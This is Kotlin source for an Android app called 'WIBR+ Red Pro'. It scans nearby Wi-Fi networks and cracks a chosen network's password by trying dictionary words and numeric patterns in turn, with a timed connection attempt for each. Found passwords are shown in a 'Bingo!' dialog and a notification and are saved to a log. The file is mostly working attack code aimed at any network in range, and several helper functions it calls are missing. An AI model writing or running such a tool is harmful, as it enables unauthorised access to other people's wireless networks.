package com.example.redwibrpro

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

data class ScannedWifiNetwork(
    val ssid: String,
    val bssid: String,
    val capabilities: String,
    val signalPercent: Int
)

data class SavedNetworkEntry(
    val ssid: String,
    val password: String,
    val savedAt: String
)

data class DictionarySource(
    val id: String,
    val title: String,
    val words: List<String>,
    val selected: Boolean = false,
    val removable: Boolean = false
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        createSuccessNotificationChannel(this)
        setContent {
            val darkRedScheme = darkColorScheme(
                primary = Color(0xFFFF3B30),
                onPrimary = Color.White,
                primaryContainer = Color(0xFF4A0E0E),
                onPrimaryContainer = Color.White,
                secondary = Color(0xFFE53935),
                onSecondary = Color.White,
                background = Color(0xFF121212),
                onBackground = Color.White,
                surface = Color(0xFF232325),
                onSurface = Color.White
            )

            MaterialTheme(colorScheme = darkRedScheme) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    RedWibrProSingleScreenApp()
                }
            }
        }
    }
}

@Composable
fun RedWibrProSingleScreenApp() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()

    val redAccent = Color(0xFFFF3B30)
    val darkBg = Color(0xFF121212)
    val panelColor = Color(0xFF232325)

    val smallAssetWords = remember { loadAssetWordlist(context, "small_wordlist.txt") }
    val patternAssetWords = remember { loadAssetWordlist(context, "common_patterns.txt") }

    var dictionaries by remember {
        mutableStateOf(
            listOf(
                DictionarySource("bruteforce", "Bruteforce", generateNumericPatterns(), selected = false, removable = false),
                DictionarySource("small", "Small Dictionary", smallAssetWords, selected = true, removable = true),
                DictionarySource("middle", "Middle Dictionary", patternAssetWords + smallAssetWords, selected = false, removable = true),
                DictionarySource("big", "Big Dictionary", (smallAssetWords + patternAssetWords + generateNumericPatterns()).distinct(), selected = false, removable = true)
            )
        )
    }

    var intervalSeconds by remember { mutableIntStateOf(7) }
    var queueWords by remember { mutableStateOf(smallAssetWords) }

    var targetSsid by remember { mutableStateOf("") }
    var targetBssid by remember { mutableStateOf("00:00:00:00:00:00") }
    var targetEncryption by remember { mutableStateOf("[WPA2-PSK]") }
    var targetSignal by remember { mutableIntStateOf(0) }

    var isRunning by remember { mutableStateOf(false) }
    var currentIndex by remember { mutableIntStateOf(0) }
    var currentPassword by remember { mutableStateOf(queueWords.firstOrNull() ?: "12345678") }
    var statusBanner by remember { mutableStateOf("Ready") }
    var networkSummary by remember { mutableStateOf(inspectNetworkState(context)) }
    var lastIpAddress by remember { mutableStateOf("-") }
    var elapsedSeconds by remember { mutableIntStateOf(0) }

    var showScanSheet by remember { mutableStateOf(false) }
    var showDictSheet by remember { mutableStateOf(false) }
    var showManualDialog by remember { mutableStateOf(false) }
    var searchQuery by remember { mutableStateOf("") }
    var scannedNetworks by remember { mutableStateOf<List<ScannedWifiNetwork>>(emptyList()) }
    var scanSummary by remember { mutableStateOf("Tap REFRESH to scan") }

    var bingoDialogData by remember { mutableStateOf<Pair<String, String>?>(null) }
    var savedNetworks by remember { mutableStateOf(loadSavedNetworks(context)) }

    var activeCallback by remember { mutableStateOf<ConnectivityManager.NetworkCallback?>(null) }
    var runnerJob by remember { mutableStateOf<Job?>(null) }

    val requiredPermissions = remember {
        buildList {
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_COARSE_LOCATION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.NEARBY_WIFI_DEVICES)
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    fun triggerRealWifiScan() {
        val outcome = performRealWifiScan(context)
        scannedNetworks = outcome.networks
        networkSummary = inspectNetworkState(context)
        scanSummary = outcome.summary
        if (targetSsid.isBlank() && outcome.networks.isNotEmpty()) {
            val first = outcome.networks.first()
            targetSsid = first.ssid
            targetBssid = first.bssid
            targetEncryption = first.capabilities
            targetSignal = first.signalPercent
        }
    }

    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        triggerRealWifiScan()
        statusBanner = "Ready"
    }

    val filePickerLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.OpenDocument()
    ) { uri: Uri? ->
        if (uri != null) {
            val loaded = readWordlistFromUri(context, uri)
            if (loaded.isNotEmpty()) {
                val fileName = uri.lastPathSegment?.substringAfterLast('/') ?: "custom_wordlist.txt"
                dictionaries = dictionaries + DictionarySource(
                    id = "file_${System.currentTimeMillis()}",
                    title = fileName,
                    words = loaded,
                    selected = true,
                    removable = true
                )
                queueWords = loaded
                currentIndex = 0
                currentPassword = loaded.first()
                statusBanner = "Loaded ${loaded.size} words"
            } else {
                statusBanner = "Empty file"
            }
        }
    }

    fun cleanupCallback() {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        activeCallback?.let { cb ->
            runCatching { cm.unregisterNetworkCallback(cb) }
        }
        activeCallback = null
    }

    fun pauseRunner(newStatus: String = "Paused") {
        runnerJob?.cancel()
        runnerJob = null
        cleanupCallback()
        isRunning = false
        statusBanner = newStatus
        networkSummary = inspectNetworkState(context)
    }

    fun saveSuccessfulConnection(ssid: String, password: String) {
        val stamp = SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.getDefault()).format(Date())
        val updated = listOf(SavedNetworkEntry(ssid, password, stamp)) +
            savedNetworks.filterNot { it.ssid == ssid && it.password == password }
        savedNetworks = updated
        persistSavedNetworks(context, updated)
    }

    @Suppress("DEPRECATION")
    fun attemptSingleWifiConnection(
        ssid: String,
        password: String,
        onConnected: () -> Unit,
        onFailed: () -> Unit
    ) {
        cleanupCallback()

        if (ssid.isBlank()) {
            onFailed()
            return
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            if (wifiManager == null) {
                onFailed()
                return
            }
            runCatching {
                val conf = WifiConfiguration()
                conf.SSID = "\"" + ssid + "\""
                if (password.isNotEmpty()) {
                    conf.preSharedKey = "\"" + password + "\""
                } else {
                    conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                }
                val netId = wifiManager.addNetwork(conf)
                if (netId != -1) {
                    wifiManager.disconnect()
                    wifiManager.enableNetwork(netId, true)
                    wifiManager.reconnect()
                } else {
                    onFailed()
                }
            }.onFailure {
                onFailed()
            }
            return
        }

        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        val specifierBuilder = WifiNetworkSpecifier.Builder().setSsid(ssid)
        if (password.isNotEmpty()) {
            specifierBuilder.setWpa2Passphrase(password)
        }

        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .setNetworkSpecifier(specifierBuilder.build())
            .build()

        var settled = false
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                if (!settled) {
                    settled = true
                    onConnected()
                }
            }

            override fun onLinkPropertiesChanged(network: Network, linkProperties: LinkProperties) {
                val ip = linkProperties.linkAddresses.firstOrNull()?.address?.hostAddress
                if (!ip.isNullOrBlank()) {
                    lastIpAddress = ip
                }
            }

            override fun onUnavailable() {
                if (!settled) {
                    settled = true
                    onFailed()
                }
            }

            override fun onLost(network: Network) {
                networkSummary = inspectNetworkState(context)
            }
        }

        activeCallback = callback
        runCatching {
            cm.requestNetwork(request, callback)
        }.onFailure {
            if (!settled) {
                settled = true
                onFailed()
            }
        }
    }

    fun resumeOrStartWordlistSequence() {
        val words = if (queueWords.isNotEmpty()) {
            queueWords
        } else {
            dictionaries.firstOrNull { it.selected }?.words ?: smallAssetWords
        }

        if (words.isEmpty() || targetSsid.isBlank()) {
            statusBanner = "Select SSID & list"
            return
        }

        pauseRunner("Running")
        isRunning = true

        runnerJob = scope.launch {
            var idx = currentIndex.coerceIn(0, words.lastIndex)
            while (isRunning && idx < words.size) {
                val candidate = words[idx]
                currentIndex = idx
                currentPassword = candidate
                statusBanner = "Trying ${idx + 1} of ${words.size}"
                networkSummary = inspectNetworkState(context)

                var connectedNow = false
                attemptSingleWifiConnection(
                    ssid = targetSsid,
                    password = candidate,
                    onConnected = { connectedNow = true },
                    onFailed = {}
                )

                val waitMs = intervalSeconds.coerceAtLeast(1) * 1000L
                val stepMs = 500L
                var waited = 0L
                while (isRunning && !connectedNow && waited < waitMs) {
                    delay(stepMs)
                    waited += stepMs
                    if (waited % 1000L == 0L) {
                        elapsedSeconds += 1
                    }
                }

                if (connectedNow) {
                    cleanupCallback()
                    isRunning = false
                    statusBanner = "Connected!"
                    saveSuccessfulConnection(targetSsid, candidate)
                    sendSuccessNotification(context, targetSsid, candidate)
                    bingoDialogData = targetSsid to candidate
                    networkSummary = inspectNetworkState(context)
                    break
                }

                cleanupCallback()
                idx++
                if (idx >= words.size) {
                    currentIndex = 0
                    isRunning = false
                    statusBanner = "Done"
                    break
                }
            }
        }
    }

    DisposableEffect(context) {
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                if (intent?.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                    val updated = readScanResultsOnly(context)
                    if (updated.isNotEmpty()) {
                        scannedNetworks = updated
                        scanSummary = "Found ${updated.size} APs"
                    }
                }
            }
        }
        val filter = IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            context.registerReceiver(receiver, filter)
        }

        triggerRealWifiScan()

        onDispose {
            runCatching { context.unregisterReceiver(receiver) }
            runnerJob?.cancel()
            cleanupCallback()
        }
    }

    bingoDialogData?.let { (winSsid, winPass) ->
        AlertDialog(
            onDismissRequest = { bingoDialogData = null },
            containerColor = panelColor,
            shape = MaterialTheme.shapes.small,
            modifier = Modifier.border(2.dp, redAccent, MaterialTheme.shapes.small),
            title = {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier
                            .size(30.dp)
                            .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                            .background(darkBg),
                        contentAlignment = Alignment.Center
                    ) {
                        Text("W+", color = redAccent, fontSize = 14.sp, fontWeight = FontWeight.ExtraBold)
                    }
                    Spacer(modifier = Modifier.width(10.dp))
                    Text("Bingo!", color = redAccent, fontSize = 22.sp, fontWeight = FontWeight.Bold)
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Text("SSID: $winSsid", color = Color.White, fontSize = 17.sp, fontWeight = FontWeight.SemiBold)
                    Text("Password: $winPass", color = redAccent, fontSize = 17.sp, fontWeight = FontWeight.Bold)
                }
            },
            confirmButton = {
                Button(
                    onClick = { bingoDialogData = null },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("OK")
                }
            }
        )
    }

    if (showManualDialog) {
        var manualSsid by remember { mutableStateOf("") }
        var manualPass by remember { mutableStateOf("") }
        AlertDialog(
            onDismissRequest = { showManualDialog = false },
            containerColor = panelColor,
            title = { Text("Add Network", color = redAccent, fontSize = 18.sp, fontWeight = FontWeight.Bold) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedTextField(
                        value = manualSsid,
                        onValueChange = { manualSsid = it },
                        label = { Text("SSID", color = redAccent) },
                        singleLine = true
                    )
                    OutlinedTextField(
                        value = manualPass,
                        onValueChange = { manualPass = it },
                        label = { Text("Password", color = redAccent) },
                        singleLine = true
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        if (manualSsid.isNotBlank()) {
                            targetSsid = manualSsid.trim()
                            if (manualPass.isNotBlank()) {
                                currentPassword = manualPass.trim()
                                saveSuccessfulConnection(manualSsid.trim(), manualPass.trim())
                            }
                            statusBanner = "Ready"
                        }
                        showManualDialog = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("Set")
                }
            },
            dismissButton = {
                TextButton(onClick = { showManualDialog = false }) {
                    Text("Cancel", color = Color.LightGray)
                }
            }
        )
    }

    if (showScanSheet) {
        val filtered = remember(scannedNetworks, searchQuery) {
            if (searchQuery.isBlank()) scannedNetworks
            else scannedNetworks.filter {
                it.ssid.contains(searchQuery, ignoreCase = true) ||
                    it.bssid.contains(searchQuery, ignoreCase = true)
            }
        }
        AlertDialog(
            onDismissRequest = { showScanSheet = false },
            containerColor = darkBg,
            modifier = Modifier
                .fillMaxWidth()
                .heightIn(max = 540.dp)
                .border(1.5.dp, redAccent, MaterialTheme.shapes.small),
            title = {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(scanSummary, color = Color.White, fontSize = 15.sp, fontWeight = FontWeight.Bold)
                    Text(
                        text = "REFRESH",
                        color = redAccent,
                        fontSize = 13.sp,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.clickable {
                            val hasPerm = requiredPermissions.all {
                                ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                            }
                            if (!hasPerm) permissionLauncher.launch(requiredPermissions)
                            else triggerRealWifiScan()
                        }
                    )
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedTextField(
                        value = searchQuery,
                        onValueChange = { searchQuery = it },
                        label = { Text("Search SSID", color = redAccent) },
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth()
                    )
                    if (filtered.isEmpty()) {
                        Text("Tap PERMS then REFRESH", color = Color.LightGray, fontSize = 13.sp)
                    } else {
                        LazyColumn(
                            modifier = Modifier.heightIn(max = 320.dp),
                            verticalArrangement = Arrangement.spacedBy(6.dp)
                        ) {
                            items(filtered) { net ->
                                Column(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .background(panelColor)
                                        .border(1.dp, Color(0xFF343438))
                                        .clickable {
                                            targetSsid = net.ssid
                                            targetBssid = net.bssid
                                            targetEncryption = net.capabilities
                                            targetSignal = net.signalPercent
                                            statusBanner = "Ready"
                                            showScanSheet = false
                                        }
                                        .padding(10.dp)
                                ) {
                                    Row(
                                        modifier = Modifier.fillMaxWidth(),
                                        horizontalArrangement = Arrangement.SpaceBetween
                                    ) {
                                        Text(net.ssid, color = redAccent, fontSize = 16.sp, fontWeight = FontWeight.Bold)
                                        Text("${net.signalPercent}%", color = Color.White, fontSize = 12.sp)
                                    }
                                    Text(net.bssid, color = Color.Gray, fontSize = 11.sp)
                                }
                            }
                        }
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { showScanSheet = false }) {
                    Text("Close", color = redAccent)
                }
            }
        )
    }

    if (showDictSheet) {
        AlertDialog(
            onDismissRequest = { showDictSheet = false },
            containerColor = darkBg,
            modifier = Modifier
                .fillMaxWidth()
                .border(1.5.dp, redAccent, MaterialTheme.shapes.small),
            title = { Text("Dictionaries & Delay", color = redAccent, fontSize = 17.sp, fontWeight = FontWeight.Bold) },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    dictionaries.forEach { dict ->
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(panelColor)
                                .clickable {
                                    dictionaries = dictionaries.map {
                                        if (it.id == dict.id) it.copy(selected = !it.selected) else it
                                    }
                                }
                                .padding(horizontal = 8.dp, vertical = 6.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Checkbox(
                                    checked = dict.selected,
                                    onCheckedChange = {
                                        dictionaries = dictionaries.map { d ->
                                            if (d.id == dict.id) d.copy(selected = !d.selected) else d
                                        }
                                    },
                                    colors = CheckboxDefaults.colors(checkedColor = redAccent, uncheckedColor = redAccent)
                                )
                                Text(dict.title, color = redAccent, fontSize = 14.sp)
                            }
                            Text("${dict.words.size}", color = Color.LightGray, fontSize = 12.sp)
                        }
                    }

                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(panelColor)
                            .padding(10.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("Delay: ${intervalSeconds}s", color = redAccent, fontSize = 14.sp)
                        Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Button(
                                onClick = { if (intervalSeconds > 3) intervalSeconds -= 1 },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF38383C), contentColor = Color.White)
                            ) { Text("-") }
                            Button(
                                onClick = { intervalSeconds += 1 },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF38383C), contentColor = Color.White)
                            ) { Text("+") }
                        }
                    }

                    Button(
                        onClick = { filePickerLauncher.launch(arrayOf("text/plain", "*/*")) },
                        colors = ButtonDefaults.buttonColors(containerColor = panelColor, contentColor = redAccent),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text("Add .txt File")
                    }
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        val merged = dictionaries.filter { it.selected }.flatMap { it.words }.distinct()
                        if (merged.isNotEmpty()) {
                            queueWords = merged
                            currentIndex = 0
                            currentPassword = merged.first()
                            statusBanner = "Ready (${merged.size})"
                        }
                        showDictSheet = false
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("Apply")
                }
            }
        )
    }

    val totalCount = queueWords.size.coerceAtLeast(1)
    val progress = ((currentIndex + 1).toFloat() / totalCount.toFloat()).coerceIn(0f, 1f)
    val mainScroll = rememberScrollState()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(darkBg)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 14.dp, vertical = 10.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(
                    modifier = Modifier
                        .size(34.dp)
                        .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                        .background(panelColor),
                    contentAlignment = Alignment.Center
                ) {
                    Text("W+", color = redAccent, fontSize = 17.sp, fontWeight = FontWeight.ExtraBold)
                }
                Spacer(modifier = Modifier.width(8.dp))
                Text("WIBR+ Red Pro", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.SemiBold)
            }

            Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                Text(
                    text = "PERMS",
                    color = redAccent,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.clickable {
                        permissionLauncher.launch(requiredPermissions)
                    }
                )
                Text(
                    text = "DICTS",
                    color = Color.White,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.clickable { showDictSheet = true }
                )
            }
        }

        HorizontalDivider(thickness = 2.dp, color = redAccent)

        Column(
            modifier = Modifier
                .weight(1f)
                .fillMaxWidth()
                .verticalScroll(mainScroll)
                .padding(horizontal = 16.dp, vertical = 10.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = statusBanner,
                color = redAccent,
                fontSize = 20.sp,
                fontWeight = FontWeight.Bold,
                textAlign = TextAlign.Center
            )

            Spacer(modifier = Modifier.height(8.dp))

            OutlinedTextField(
                value = targetSsid,
                onValueChange = { targetSsid = it },
                label = { Text("SSID", color = redAccent) },
                singleLine = true,
                modifier = Modifier.fillMaxWidth()
            )

            Spacer(modifier = Modifier.height(8.dp))

            OutlinedTextField(
                value = currentPassword,
                onValueChange = { currentPassword = it },
                label = { Text("Password", color = redAccent) },
                singleLine = true,
                modifier = Modifier.fillMaxWidth()
            )

            Spacer(modifier = Modifier.height(8.dp))

            if (isRunning) {
                CircularProgressIndicator(
                    color = Color.White,
                    trackColor = Color.DarkGray,
                    modifier = Modifier.size(26.dp),
                    strokeWidth = 2.5.dp
                )
                Spacer(modifier = Modifier.height(8.dp))
            }

            Text("BSSID: $targetBssid", color = redAccent, fontSize = 14.sp)
            Text("Encryption: $targetEncryption", color = redAccent, fontSize = 13.sp)

            Spacer(modifier = Modifier.height(8.dp))

            LinearProgressIndicator(
                progress = { progress },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(3.dp),
                color = redAccent,
                trackColor = Color(0xFF2C2C2E)
            )

            Spacer(modifier = Modifier.height(10.dp))

            Column(
                modifier = Modifier.fillMaxWidth(),
                verticalArrangement = Arrangement.spacedBy(5.dp)
            ) {
                StatLine("Password:", "${currentIndex + 1} of $totalCount", redAccent)
                StatLine("Step duration:", "$intervalSeconds sec", redAccent)
                StatLine("Elapsed time:", "${elapsedSeconds}s", redAccent)
                StatLine("Signal level:", "$targetSignal", redAccent)
                StatLine("System status:", networkSummary, redAccent)
                StatLine("IP Address:", lastIpAddress, redAccent)
            }

            if (savedNetworks.isNotEmpty()) {
                Spacer(modifier = Modifier.height(14.dp))
                Text(
                    text = "Saved Log (${savedNetworks.size})",
                    color = redAccent,
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(modifier = Modifier.height(6.dp))
                savedNetworks.forEach { entry ->
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 4.dp)
                            .background(panelColor)
                            .border(1.dp, Color(0xFF343438))
                            .padding(10.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(
                            modifier = Modifier
                                .weight(1f)
                                .clickable {
                                    targetSsid = entry.ssid
                                    currentPassword = entry.password
                                    statusBanner = "Ready"
                                }
                        ) {
                            Text(entry.ssid, color = redAccent, fontSize = 16.sp, fontWeight = FontWeight.Bold)
                            Text("Password: ${entry.password}", color = redAccent, fontSize = 14.sp)
                            Text(entry.savedAt, color = Color.Gray, fontSize = 11.sp)
                        }
                        Box(
                            modifier = Modifier
                                .size(36.dp)
                                .background(Color(0xFF38383C))
                                .clickable {
                                    val updated = savedNetworks.filterNot { it == entry }
                                    savedNetworks = updated
                                    persistSavedNetworks(context, updated)
                                },
                            contentAlignment = Alignment.Center
                        ) {
                            Text("DEL", color = redAccent, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }

        Column(
            modifier = Modifier
                .fillMaxWidth()
                .background(darkBg)
                .padding(horizontal = 12.dp, vertical = 8.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Button(
                    onClick = {
                        val hasPerm = requiredPermissions.all {
                            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                        }
                        if (!hasPerm) permissionLauncher.launch(requiredPermissions)
                        else triggerRealWifiScan()
                        showScanSheet = true
                    },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White),
                    modifier = Modifier
                        .weight(1f)
                        .height(44.dp)
                ) {
                    Text("Scan APs", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                }

                Button(
                    onClick = { showManualDialog = true },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = panelColor, contentColor = redAccent),
                    modifier = Modifier
                        .weight(1f)
                        .height(44.dp)
                ) {
                    Text("Add Network", fontSize = 14.sp, fontWeight = FontWeight.Bold)
                }
            }

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Button(
                    onClick = {
                        if (isRunning) pauseRunner("Paused")
                        else resumeOrStartWordlistSequence()
                    },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = panelColor, contentColor = redAccent),
                    modifier = Modifier
                        .weight(1f)
                        .height(48.dp)
                ) {
                    Text(
                        text = if (isRunning) "Pause" else if (currentIndex > 0) "Resume" else "Start (${intervalSeconds}s)",
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold
                    )
                }

                Button(
                    onClick = {
                        statusBanner = "Trying ${currentIndex + 1} of $totalCount"
                        attemptSingleWifiConnection(
                            ssid = targetSsid,
                            password = currentPassword,
                            onConnected = {
                                statusBanner = "Connected!"
                                saveSuccessfulConnection(targetSsid, currentPassword)
                                sendSuccessNotification(context, targetSsid, currentPassword)
                                bingoDialogData = targetSsid to currentPassword
                            },
                            onFailed = {
                                statusBanner = "Failed"
                            }
                        )
                    },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White),
                    modifier = Modifier
                        .weight(1f)
                        .height(48.dp)
                ) {
                    Text("Try Now", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}

@Composable
private fun StatLine(label: String, value: String, color: Color) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(label, color = color, fontSize = 15.sp)
        Text(value, color = color, fontSize = 15.sp)
    }
}

private data class ScanOutcome(
    val networks: List<ScannedWifiNetwork>,
    val summary: String
)

private const val PREFS_NAME = "red_wibr_prefs"
private const val KEY_SAVED_NETWORKS = "saved_networks_json"
private const val CHANNEL_ID = "wibr_success_channel"

private fun loadSavedNetworks(context: Context): List<SavedNetworkEntry> {
    val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    val raw = prefs.getString(KEY_SAVED_NETWORKS, null) ?: return emptyList()
    return runCatching {
        val arr = JSONArray(raw)
        buildList {
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                add(
                    SavedNetworkEntry(
                        ssid = obj.optString("ssid"),
                        password = obj.optString("password"),
                        savedAt = obj.optString("savedAt")
                    )
                )
            }
        }
    }.getOrElse { emptyList() }
}

private fun persistSavedNetworks(context: Context, list: List<SavedNetworkEntry>) {
    val arr = JSONArray()
    list.forEach { item ->
        arr.put(
            JSONObject().apply {
                put("ssid", item.ssid)
                put("password", item.password)
                put("savedAt", item.savedAt)
            }
        )
    }
    context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        .edit()
        .putString(KEY_SAVED_NETWORKS, arr.toString())
        .apply()
}

private fun createSuccessNotificationChannel(context: Context) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Wi-Fi Connection Results",
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = "Alerts when a Wi-Fi password succeeds"
        }
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.createNotificationChannel(channel)
    }
}

private fun sendSuccessNotification(context: Context, ssid: String, password: String) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
        ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
    ) {
        return
    }
    val notification = NotificationCompat.Builder(context, CHANNEL_ID)
        .setSmallIcon(R.drawable.ic_wibr_red)
        .setContentTitle("Bingo! Connected to $ssid")
        .setContentText("Password: $password")
        .setColor(0xFFFF3B30.toInt())
        .setPriority(NotificationCompat.PRIORITY_HIGH)
        .setAutoCancel(true)
        .build()

    val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    nm.notify(ssid.hashCode(), notification)
}

private fun loadAssetWordlist(context: Context, assetName: String): List<String> {
    return runCatching {
        context.assets.open(assetName).use { stream ->
            BufferedReader(InputStreamReader(stream)).readLines()
                .map { it.trim() }
                .filter { it.isNotEmpty() }
        }
    }.getOrElse { emptyList() }
}

